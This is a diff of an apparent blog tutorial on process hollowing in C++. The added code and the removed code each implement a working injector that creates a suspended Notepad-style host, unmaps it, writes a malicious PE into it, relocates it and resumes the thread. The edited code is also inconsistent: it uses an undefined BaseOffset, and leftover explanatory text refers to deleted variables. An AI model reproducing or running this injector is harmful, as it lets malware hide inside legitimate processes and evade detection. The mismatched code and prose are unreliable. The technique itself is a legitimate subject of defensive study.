@@ -59,113 +59,109 @@ Finally, we need to resume the suspended process using ResumeThread. The process
 
 ## C++ Implamentation
 
-Starting with importing the necessary libraries :
-
+Starting with importing the necessary libraries and Typedefs :
 ```cpp
+#include <stdio.h>
 #include <windows.h>
-#include "internals.h"
-#include "pe.h"
+#include <string.h>
+#include <winternl.h>
+
+typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+
+typedef struct BASE_RELOCATION_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
 ```
+We will see what are these Typdefs, don't worry.
 
 ### Suspended Process Creation
 
 So as we said we should create a new instance of a legitimate process ( Notepade ) in a suspended state, why, because we should unmap its original code and replace it with our malicious one before the execution of its main thread.
 
-Let us create a function named ```CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)``` , The pSourceFile is our malicious code (PE).
+So i'm gonna implement this inside a main function.
 ```cpp
-void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile){
-
-    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
-    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
-    
-    CreateProcessA(
-        0,
-        pDestCmdLine,      
-        0, 
-        0, 
-        0, 
-        CREATE_SUSPENDED, 
-        0, 
-        0, 
-        pStartupInfo, 
-        pProcessInfo
-    );
-
-    if (!pProcessInfo->hProcess)
-    {
-        printf("Error creating process\r\n");
-        return;
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        printf("Usage: Process Hollowing.exe [Host.exe] [Inject]\n");
+        return 0;
     }
+    LPSTARTUPINFOA pStartupinfo = new STARTUPINFOA();
+    PROCESS_INFORMATION proc_info;
+
+    printf("Creating Suspended Process. [%s]\n", argv[1]);
+    CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pStartupinfo, &proc_info);
 }
 ```
+First, I check for the correct number of arguments: the host process executable and the malicious executable.
 So as you can see there is two new structures that I used, STARTUPINFOA and PROCESS_INFORMATION, which are two crucial structures that provide information about the startup configuration and state of the new process and its primary thread.
 
 You can find more a about them in Windows APIs documentation here [STARTUPINFOA]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa') and here [PROCESS_INFORMATION]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information')
 
-### Unmap the target process's memory
+### Mapping the malicious file to memory.
 
-So after creating the suspended process, let's Unmap it.
+So after creating the suspended process, let's Map our malicious file.
 
 ```cpp
-    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
-    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
+    HANDLE HEvilFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    DWORD EvilFileSize = GetFileSize(HEvilFile, NULL);
+    PBYTE EvilImage = new BYTE[EvilFileSize];
 
-    printf("Opening source image\r\n");
+    printf("Mapping File To Memory. [%s]\n", argv[2]);
+    DWORD readbytes;
+    ReadFile(HEvilFile, EvilImage, EvilFileSize, &readbytes, NULL);
 
-    HANDLE hFile = CreateFileA(
-        pSourceFile,
-        GENERIC_READ, 
-        0, 
-        0, 
-        OPEN_ALWAYS, 
-        0, 
-        0
-    );
+```
+So the malicious file specified by the second command-line argument ```argv[2]``` is opened for reading using the ```CreateFileA()``` function, with the ```GENERIC_READ``` flag allowing read access and ```FILE_SHARE_READ``` permitting shared read access by other processes. The ```OPEN_EXISTING``` flag just ensures the file must already exist, it is possible to not setting it if we want to create the malicious process during executing the code. 
 
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        printf("Error opening %s\r\n", pSourceFile);
-        return;
+Now The handle to this file is stored in ```HEvilFile```and we can grap The size of the malicious file which is then determined using GetFileSize, which returns the size in bytes. After that a EvilImage buffer is allocated in memory to hold the contents of the malicious file, with its size matching the file size. Then we use the ReadFile() function to read the file into this EvilImage buffer, which reads the entire file into memory and stores the number of bytes read in the readbytes variable. 
+
+So after reading the file, 
+
+### Getting the Current Context
+Of course you are wondering what is this Context or Thread Context, lets take an overview on it. A thread context is a structure that contains the register values and other state information of a thread. It is crucial for operations such as debugging, thread manipulation, and our today's technique ```process hollowing```. The context includes the ```instruction pointer```, ```stack pointer```, and other registers that define the current state of the CPU as it executes the thread. So by manipulating the context, a program can control the execution flow of a thread, which is essential for techniques like process hollowing, where the goal is to replace the code of a legitimate process with malicious code while maintaining the execution context.
+
+So lets see it on the code.
+```
+    LPCONTEXT pContext = new CONTEXT();
+    pContext->ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(proc_info.hThread, pContext)) {
+        printf("Error getting context\n");
+        return 0;
     }
+```
+Here, a new CONTEXT structure is allocated on the heap. LPCONTEXT is a pointer to a CONTEXT structure which we'll use this to hold the register values and other state information of the thread.
+The ContextFlags member of the CONTEXT structure is set to CONTEXT_FULL. This indicates that all parts of the thread's context should be retrieved, including the control registers, integer registers, and floating-point registers.
 
-    DWORD dwSize = GetFileSize(hFile, 0);
-    PBYTE pBuffer = new BYTE[dwSize];
-    DWORD dwBytesRead = 0;
-    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
-    CloseHandle(hFile);
-    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
-    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
+### Getting the Base Address of the Suspended Process
 
-    printf("Unmapping destination section\r\n");
+```
+    PVOID BaseAddress;
 
+    #ifdef _X86_ 
+        ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);
+    #endif
+
+    #ifdef _WIN64
+        ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
+    #endif
+```
+### Unmapping Sections
+```
+    printf("Unmapping Section.\n");
     HMODULE hNTDLL = GetModuleHandleA("ntdll");
     FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
     _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
-
-    DWORD dwResult = NtUnmapViewOfSection(
-        pProcessInfo->hProcess, 
-        pPEB->ImageBaseAddress
-    );
-
-    if (dwResult)
-    {
-        printf("Error unmapping section\r\n");
-        return;
+    if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
+        printf("Error Unmapping Section\n");
+        return 0;
     }
 ```
-
-Before doing the unmaping, we should know about the PEB structure, the PEB is a data structure in the Windows operating system that holds information about a process. It includes details such as loaded modules, heap addresses, and the process image base address. Accessing the PEB of a target process is necessary to retrieve this critical information.
-
-So let's take a pointer on the PEB with ReadRemotePEB() and load Image base address from it using ReadRemoteImage().
-
-The purpose of reading the base address of the executable image is to know where the executable image of the process is loaded in memory.
-
-After this step, we should get a handle on our malicious file that we want to replace the target's memory with, using CreateFileA(), reading it's content to a buffer and converts the raw image buffer (buffer) into a LOADED_IMAGE structure, which contains parsed information about the image.
-
-So after getting the necessary informations, we Unmapped the target's process memory with NtUnmapViewOfSection, imported from the ntdll.dll library.
-
-Note that we didn't create our malicious file yet.
-
 ### Allocate and write malicious code
 
 As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory, you should know about the structure of a PE file ( Portable Executable ). A Portable Executable (PE) file is a file format used in Windows operating systems for executables, object code, and DLLs (Dynamic Link Libraries). The format is designed so that the operating system can load and manage these files efficiently. 
@@ -198,55 +194,10 @@ Here are some common Sections in PE Files.
 So i encourage you to do your homeworks about these stuffs, now let's break down the code.
 
 ```cpp
-    PVOID pRemoteImage = VirtualAllocEx(
-        pProcessInfo->hProcess,
-        pPEB->ImageBaseAddress,
-        pSourceHeaders->OptionalHeader.SizeOfImage,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
+    PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)EvilImage;
+    PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS)((LPBYTE)EvilImage + dos_head->e_lfanew);
 
-    if (!pRemoteImage)
-    {
-        printf("VirtualAllocEx call failed\r\n");
-        return;
-    }
-
-    printf("Writing headers\r\n");
-
-    if (!WriteProcessMemory(
-        pProcessInfo->hProcess,                 
-        pPEB->ImageBaseAddress, 
-        pBuffer, 
-        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
-        0
-    ))
-    {
-        printf("Error writing process memory\r\n");
-        return;
-    }
-
-    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
-    {
-        if (!pSourceImage->Sections[x].PointerToRawData)
-            continue;
-
-        PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
-
-        printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
-
-        if (!WriteProcessMemory(
-            pProcessInfo->hProcess,            
-            pSectionDestination,            
-            &pBuffer[pSourceImage->Sections[x].PointerToRawData],
-            pSourceImage->Sections[x].SizeOfRawData,
-            0
-        ))
-        {
-            printf("Error writing process memory\r\n");
-            return;
-        }
-    }    
+    PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
 ```
 First, as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from the code PE header using ``` pSourceHeaders->OptionalHeader.SizeOfImage ```.
 
@@ -267,9 +218,24 @@ if (!WriteProcessMemory(
         return;
     }
 ```
-Passing now to writing the sections, the for loop iterate trought the number of sections and write each one.
-Note that the line  ``` PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress); ``` serves the updated adress where we can write the coming sections ( it's like one under one ).
+Retrieves the DOS and NT headers from the mapped malicious file.
+Allocates memory in the suspended process for the malicious image
+```
+    if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
+        printf("Failed to write Headers\n");
+        return 0;
+    }
 
+    PIMAGE_SECTION_HEADER sec_head;
+    printf("Writing Sections:\n");
+    for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
+        sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+        printf("0x%lx -- Writing Section: %s\n", (LPBYTE)mem + sec_head->VirtualAddress, sec_head->Name);
+        if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((LPBYTE)mem + sec_head->VirtualAddress), (PVOID)((LPBYTE)EvilImage + sec_head->PointerToRawData), sec_head->SizeOfRawData, NULL)) {
+            printf("Error Writing section: %s. At: %x%llp\n", sec_head->Name, (LPBYTE)mem + sec_head->VirtualAddress);
+        }
+    }
+```
 ### Adjust Base Adresses ( relocating : The hard part for me )
 
 It seems like we are done !!! but no, we should adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. 
@@ -279,266 +245,81 @@ The .reloc section in a part of PE file contains relocation information used by 
 
 For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes into play.
 
-These are some impotant topics to search about and take in consideration, now i want to ask about how really we gonna know if the relocation is necessary? the answer is quit simple, we calculate a difference called delta, it is a difference between the base addresses of the source image and the target process. If there is no difference, relocation is not necessary.
-
-now let's implement this on our code :
 
 ```cpp
-    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
-    if (dwDelta)
-    {
-        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
-        {
-            char* pSectionName = ".reloc";        
-
-            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
+        if (BaseOffset) {
+        printf("\nRelocating The Relocation Table...\n");
+        for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
+            sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+            char pSectionName[] = ".reloc";
+            if (memcmp(sec_head->Name, pSectionName, strlen(pSectionName))) {
                 continue;
-
-            printf("Rebasing image\r\n");
-
-            DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
-            DWORD dwOffset = 0;
-
-            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
-            while (dwOffset < relocData.Size)
-            {
-                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
-                dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-
-                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
-                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
-
-                for (DWORD y = 0; y <  dwEntryCount; y++)
-                {
-                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);
-
-                    if (pBlocks[y].Type == 0)
-                        continue;
-
-                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
-
-                    DWORD dwBuffer = 0;
-                    ReadProcessMemory(
-                        pProcessInfo->hProcess, 
-                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
-                        &dwBuffer,
-                        sizeof(DWORD),
-                        0
-                    );
-
-                    dwBuffer += dwDelta;
-
-                    BOOL bSuccess = WriteProcessMemory(
-                        pProcessInfo->hProcess,
-                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
-                        &dwBuffer,
-                        sizeof(DWORD),
-                        0
-                    );
-
-                    if (!bSuccess)
-                    {
-                        printf("Error writing memory\r\n");
-                        continue;
-                    }
-                }
             }
 
-            break;
+            DWORD RelocAddress = sec_head->PointerToRawData;
+            IMAGE_DATA_DIRECTORY RelocData = nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+            DWORD Offset = 0;
+
+            while (Offset < RelocData.Size) {
+                PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&EvilImage[RelocAddress + Offset];
+                printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->PageAddress, pBlockHeader->BlockSize);
+                Offset += sizeof(BASE_RELOCATION_BLOCK);
+
+                DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+                printf("%d Entries Must Be Relocated In The Current Block.\n", EntryCount);
+
+                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&EvilImage[RelocAddress + Offset];
+
+                for (int x = 0; x < EntryCount; x++) {
+                    Offset += sizeof(BASE_RELOCATION_ENTRY);
+                    if (pBlocks[x].Type == 0) {
+                        printf("The Type Of Base Relocation Is 0. Skipping.\n");
+                        continue;
+                    }
+
+                    DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;
+
+                    #ifdef _X86_
+                    DWORD EntryAddress = 0;
+                    ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0);
+                    printf("0x%llx --> 0x%llx | At:0x%llx\n", EntryAddress, EntryAddress + BaseOffset, (PVOID)((DWORD)BaseAddress + FieldAddress));
+                    EntryAddress += BaseOffset;
+                    if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0)) {
+                        printf("Error Writing Entry.\n");
+                    }
+                    #endif
+                    #ifdef _WIN64
+                    DWORD64 EntryAddress = 0;
+                    ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0);
+                    printf("0x%llx --> 0x%llx | At:0x%llx\n", EntryAddress, EntryAddress + BaseOffset, (PVOID)((DWORD64)BaseAddress + FieldAddress));
+                    EntryAddress += BaseOffset;
+                    if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0)) {
+                        printf("Error Writing Entry.\n");
+                    }
+                    #endif
+                }
+            }
         }
     }
+
 ```
-so this part is a little bit sneaky, we just check if the delta (dwDelta) is equal 0 or not. If not, we iterate over the sections to look for the .reloc section. once we got the .reloc, we do the rebasing of image. Here is a break down of the code :
+### Updating Context and Resuming the Process
 
-1. **Get the Address of the Relocation Section's Raw Data**
+```
+    #ifdef _X86_
+    pContext->Eax = (DWORD)BaseAddress + nt_head->OptionalHeader.AddressOfEntryPoint;
+    #endif
+    #ifdef _WIN64
+    pContext->Rcx = (DWORD64)BaseAddress + nt_head->OptionalHeader.AddressOfEntryPoint;
+    #endif
 
-    ```cpp
-    DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
-    DWORD dwOffset = 0;
-    ```
-We start by initializing the address and offset for reading the relocation data. `dwRelocAddr` is the starting address of the raw data for the `.reloc` section, and `dwOffset` is set to zero to begin processing from the start.
-
-2. **Get the Relocation Data Directory**
-
-    ```cpp
-    IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    ```
-This retrieve the relocation data directory from the PE file's optional header. This directory contains information about the relocation data size and virtual address.
-
-Now lets start processing each relocation block
-
-3. **Process Relocation Data**
-
-    ```cpp
-    while (dwOffset < relocData.Size)
-    ```
-
-    - **Purpose:** Continue processing relocation data until the end of the section.
-    - **Explanation:** `relocData.Size` is the total size of the relocation data. The loop continues until `dwOffset` reaches this size.
-
-4. **Get the Relocation Block Header**
-
-    ```cpp
-    PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
-    dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-    ```
-
-now we accessing the header of the current relocation block and update the offset. `pBlockheader` points to the beginning of the relocation block header in the data buffer and `dwOffset` is incremented by the size of the block header to move to the next section of data.
-
-5. **Calculate Number of Relocation Entries**
-
-    ```cpp
-    DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
-    PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];
-    ```
-
-After we got the `pBlockheader`, lets determine the number of relocation entries in the current block. `CountRelocationEntries` calculates how many entries are present based on the block size. `pBlocks` points to the start of these entries.
-
-6. **Process Each Relocation Entry**
-
-    ```cpp
-    for (DWORD y = 0; y < dwEntryCount; y++)
-    ```
-Iterating through each relocation entry in the current block. `dwEntryCount` gives the number of entries to process. The loop index `y` is used to access each entry.
-
-7. **Skip Non-Relocatable Entries**
-
-    ```cpp
-    dwOffset += sizeof(BASE_RELOCATION_ENTRY);
-    if (pBlocks[y].Type == 0)
-        continue;
-    ```
-We should skip entries that are not relocatable. `dwOffset` is incremented to move to the next entry. The if statement checks if the Type field of the current relocation entry is 0 (IMAGE_REL_BASED_ABSOLUTE you should read about this). A relocation type of 0 means that the entry is not relocatable and should be ignored. If the type is 0, the continue statement skips the rest of the loop's body and moves to the next iteration, effectively ignoring this entry.
-
-Now after we get access to the entries, we should adjust adresses.
-
-8. **Calculate the Address to be Relocated**
-
-    ```cpp
-    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
-    ```
-Starting by calculating the address that needs adjustment. The `dwFieldAddress` is calculated by adding the `PageAddress` from the block header to the `Offset` from the entry.
-
-9. **Read the Value at the Address**
-
-    ```cpp
-    DWORD dwBuffer = 0;
-    ReadProcessMemory(
-        pProcessInfo->hProcess, 
-        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
-        &dwBuffer,
-        sizeof(DWORD),
-        0
-    );
-    ```
-
-Now lets read the current value from the target process memory. The `ReadProcessMemory` retrieves the value from the calculated address into `dwBuffer`.
-
-10. **Adjust the Value by the Relocation Delta**
-
-    ```cpp
-    dwBuffer += dwDelta;
-    ```
-
- After reading that value, we should adjust it by the relocation delta. The value read from memory is updated by adding `dwDelta` to correct the address.
-
-11. **Write the Adjusted Value Back**
-
-    ```cpp
-    BOOL bSuccess = WriteProcessMemory(
-        pProcessInfo->hProcess,
-        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
-        &dwBuffer,
-        sizeof(DWORD),
-        0
-    );
-    ```
-
-Write the adjusted value back to the process memory. `WriteProcessMemory` updates the value at the computed address with the adjusted `dwBuffer`.
-
-12. **Check if Write Was Successful**
-
-    ```cpp
-    if (!bSuccess)
-    {
-        printf("Error writing memory\r\n");
-        continue;
+    printf("Resuming Process\n");
+    if (!SetThreadContext(proc_info.hThread, pContext)) {
+        printf("Error Setting Thread Context\n");
     }
-    ```
 
-Check if the memory write operation was successful. If `bSuccess` is `FALSE`, an error message is printed, and the loop continues to the next entry.
-
-13. **Break the Loop**
-
-    ```c
-    break;
-    ```
-Exit the loop once the `.reloc` section has been fully processed. This loop terminates after processing the `.reloc` section to prevent unnecessary iterations.
-
-Now after the relocation step is completed. we should set the EntryPoint for the program. So what is this "Entry Point", The AddressOfEntryPoint is the relative address within the PE file where the execution starts. This is also specified in the Optional Header of the PE file. it is given as an RVA, meaning it is relative to the BaseAddress and it marks the starting point for execution, often where the main function or the entry function for a DLL (like DllMain) resides.
-
-Lets implement this,
-
-The following section of the code sets a breakpoint at the entry point of the PE file. This is done conditionally with the `#ifdef WRITE_BP` directive.
-
-```cpp
-#ifdef WRITE_BP
-printf("Writing breakpoint\r\n");
-
-if (!WriteProcessMemory(
-    pProcessInfo->hProcess, 
-    (PVOID)dwEntrypoint, 
-    &dwBreakpoint, 
-    4, 
-    0
-))
-{
-    printf("Error writing breakpoint\r\n");
-    return;
-}
-#endif
-```
-The code within #ifdef WRITE_BP is included only if WRITE_BP is defined and the WriteProcessMemory() writes a breakpoint (dwBreakpoint) to the entry point (dwEntrypoint) of the target process.
-
-Passing now to managing the thread context, After setting the breakpoint, the code retrieves and sets the thread context to modify the instruction pointer to the entry point of the PE file.
-
-```cpp
-LPCONTEXT pContext = new CONTEXT();
-pContext->ContextFlags = CONTEXT_INTEGER;
-
-printf("Getting thread context\r\n");
-
-if (!GetThreadContext(pProcessInfo->hThread, pContext))
-{
-    printf("Error getting context\r\n");
-    return;
-}
-
-pContext->Eax = dwEntrypoint;            
-
-printf("Setting thread context\r\n");
-
-if (!SetThreadContext(pProcessInfo->hThread, pContext))
-{
-    printf("Error setting context\r\n");
-    return;
+    if (!ResumeThread(proc_info.hThread)) {
+        printf("Error Resuming Thread\n");
+    }
 }
 ```
-this steps involves managing the thread context to ensure proper execution of the relocated code. First, a new CONTEXT structure is allocated and initialized with CONTEXT_INTEGER to indicate that the integer registers are being modified. The GetThreadContext function is then called to retrieve the current context of the thread. Once the context is retrieved, the EAX register is set to the entry point address (dwEntrypoint), effectively setting the instruction pointer to the entry point of the relocated code. The SetThreadContext function is then used to update the thread context with these modified values. Throughout this process, any errors encountered while getting or setting the thread context are handled by printing error messages and returning from the function to ensure that issues are promptly addressed.
-
-The last step, after setting all, is resuming the main thread.
-
-```cpp
-printf("Resuming thread\r\n");
-
-if (!ResumeThread(pProcessInfo->hThread))
-{
-    printf("Error resuming thread\r\n");
-    return;
-}
-
-printf("Process hollowing complete\r\n");
-```
-
-
